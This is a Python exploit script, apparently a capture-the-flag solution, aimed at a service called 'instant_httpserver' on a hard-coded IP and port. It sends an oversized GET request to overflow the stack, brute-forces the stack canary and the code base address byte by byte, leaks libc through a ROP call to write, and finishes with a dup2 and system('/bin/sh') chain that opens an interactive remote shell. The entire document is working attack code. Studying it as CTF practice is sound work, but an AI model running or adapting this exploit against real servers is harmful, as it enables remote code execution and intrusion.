from ptrlib import *
import threading

logger.level = 0
TIMEOUT = 0.1
#HOST = "localhost"
HOST = "114.177.250.4"

# leak canary
#"""
payload = b'GET '
payload += b'A' * (0x208 - len(payload))
canary = b'\x00'
for i in range(7):
    for c in range(0x100):
        sock = Socket(HOST, 4445)
        sock.send(payload + canary + bytes([c]))
        sock.recvuntil("Length is ")
        w = b''
        for i in range(5):
            x = sock.recv(timeout=TIMEOUT)
            if x is None: break
            w += x
        if b'instant' not in w:
            sock.close()
            continue
        else:
            canary += bytes([c])
            print(canary)
            sock.close()
            break
    else:
        print("Something is wrong")
        exit(0)
"""
canary = b'\x00\x89h\xfd\xf7q\xd3K'
#"""

# leak proc
#"""
payload = b'GET '
payload += b'A' * (0x208 - len(payload))
payload += canary
payload += b'X' * 8
proc_base = b'\xe5'
for i in range(7):
    for c in range(0x100):
        sock = Socket(HOST, 4445)
        sock.send(payload + proc_base + bytes([c]))
        sock.recvuntil("Length is ")
        w = b''
        for i in range(5):
            x = sock.recv(timeout=TIMEOUT)
            if x is None: break
            w += x
        if b'instant' not in w:
            sock.close()
            continue
        else:
            proc_base += bytes([c])
            print(proc_base)
            sock.close()
            break
    else:
        print("Something is wrong")
        exit(0)
proc_base = u64(proc_base) - 0xde5
print(hex(u64(proc_base)))
"""
proc_base = u64(b'\xe5\xcd\xbf\xbc\nV\x00\x00') - 0xde5
print(hex(proc_base))
#"""

# libc leak
libc = ELF("libc.so.6")
elf = ELF("./instant_httpserver")
rop_pop_rdi = 0x00000e93
rop_pop_rsi_r15 = 0x00000e91
payload = b'GET '
payload += b'A' * (0x208 - len(payload))
payload += canary
payload += b'X' * 8
payload += p64(proc_base + rop_pop_rsi_r15)
payload += p64(proc_base + elf.got("write"))
payload += p64(0xdeadbeef)
payload += p64(proc_base + elf.plt("write"))
sock = Socket(HOST, 4445)
sock.send(payload)
sock.recvuntil("is 520")
libc_base = u64(sock.recv(8)) - libc.symbol("write")
print(hex(libc_base))
sock.close()

# get the shell!
libc = ELF("libc.so.6")
elf = ELF("./instant_httpserver")
payload = b'GET '
payload += b'A' * (0x208 - len(payload))
payload += canary
payload += b'X' * 8
payload += p64(proc_base + rop_pop_rsi_r15)
payload += p64(1)
payload += p64(0xdeadbeef)
payload += p64(libc_base + libc.symbol('dup2'))
payload += p64(proc_base + rop_pop_rsi_r15)
payload += p64(0)
payload += p64(0xdeadbeef)
payload += p64(libc_base + libc.symbol('dup2'))
payload += p64(proc_base + rop_pop_rdi + 1)
payload += p64(proc_base + rop_pop_rdi)
payload += p64(libc_base + next(libc.find('/bin/sh')))
payload += p64(libc_base + libc.symbol('system'))
sock = Socket(HOST, 4445)
sock.send(payload)

sock.interactive()
